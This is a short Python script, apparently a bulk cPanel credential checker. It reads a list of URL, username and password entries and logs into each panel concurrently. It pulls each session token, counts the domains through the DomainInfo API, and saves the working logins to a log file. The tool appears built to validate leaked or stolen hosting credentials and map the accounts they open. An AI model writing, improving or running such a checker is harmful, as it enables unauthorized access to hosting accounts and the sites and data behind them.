import requests,sys
import json
import time
from concurrent.futures import ThreadPoolExecutor
from colorama import *
requests.urllib3.disable_warnings()
init(autoreset=True)

msg0 ="Coded By Hyper cPanel And Domain Number Checker\n"

for i in msg0:
        sys.stdout.write(i)
        sys.stdout.flush()
        time.sleep(0.02)


filename = input("Enter cPanel List: ")
urls = []

with open(filename, 'r', encoding="iso-8859-1") as f:
    for line in f:
        urls.append(line.strip().split('|'))

def get_domain_count(url, username, password):
    data_user_pass = {
        "user": username,
        "pass": password
    }
    s = requests.Session()
    try:
        resp = s.post(f"{url}/login/?login_only=1", data=data_user_pass, timeout=20, allow_redirects=True)
        login_resp = json.loads(resp.text)
        time.sleep(0.05)  
        cpsess_token = login_resp["security_token"][7:]
        resp = s.post(f"{url}/cpsess{cpsess_token}/execute/DomainInfo/domains_data", data={"return_https_redirect_status":"1"})
        domains_data = json.loads(resp.text)
        total_domain = 1
        if domains_data["status"] == 1:
            total_domain += len(domains_data["data"]["sub_domains"])
            total_domain += len(domains_data["data"]["addon_domains"])
        print(Fore.GREEN + f"[GOOD CPANEL] --> {url} | Domains: {total_domain}")
        open(f"SuccescPanels.log", "a").write(url + "|" + username + "|" + password + "\n")
        open(f"DomainNumberList.txt", "a", encoding="iso-8859-1").write(url + " --> Domains: " + str(total_domain) + "\n")
    except Exception:
        print(Fore.RED + f"Bad! Login: {url}")
    finally:
        s.close()
        time.sleep(0.05)

with ThreadPoolExecutor(max_workers=10) as executor:
    for url_info in urls:
        url, username, password = url_info
        executor.submit(get_domain_count, url, username, password)